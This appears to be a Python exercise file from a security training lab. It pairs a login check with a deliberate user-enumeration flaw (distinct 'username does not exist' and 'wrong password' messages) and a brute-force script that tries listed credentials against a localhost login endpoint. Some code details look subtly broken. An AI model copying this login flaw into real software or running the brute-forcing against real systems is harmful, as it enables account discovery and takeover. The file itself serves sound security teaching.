import requests
from flask import Response

def error_message_helper(message):
    return {"message": message}

def check_credentials(vuln, request_data, user):
    user_error_message = "Username does not exist"
    password_error_message = "Password is not correct for the given username."
    
    users_list = ["name1", "name2", "name3", "name4", "name5", "admin"]
    pass_list = ["pass1", "pass2", "pass3", "pass4", "pass5", "admin"]

    if vuln:  # Password Enumeration
        if user and request_data.get('password') != user.password:
            return Response(error_message_helper(password_error_message), 200, mimetype="application/json")
        elif not user:  # User enumeration
            return Response(error_message_helper(user_error_message), 200, mimetype="application/json")
    else:
        if (user and request_data.get('password') != user.password) or (not user):
            return Response(error_message_helper(password_error_message + " Week2 Completed"), 200, mimetype="application/json")

    return None

def enumerate_users():
    users_list = ["name1", "name2", "name3", "name4", "name5", "admin"]
    pass_list = ["pass1", "pass2", "pass3", "pass4", "pass5", "admin"]
    password_error_message = "Password is not correct for the given username."

    for user in users_list:
        for password in pass_list:
            data = {
                "username": user,
                "password": password
            }
            response = requests.post("http://localhost:5000/users/v1/login", json=data)
            body = response.json()
            if body["message"] == password_error_message:
                print(f"User {user} does exist, checking passwords")
            elif body["message"] == "Successfully logged in.":
                print(f"Found {user} with password {password}")
            else:
                break

# Example usage
if __name__ == "__main__":
    request_data = {"username": "admin", "password": "pass1"}
    user = None  # Replace with actual user fetching logic
    vuln = True

    response = check_credentials(vuln, request_data, user)
    if response:
        print(response.get_json())  # Or handle the response appropriately
    else:
        enumerate_users()

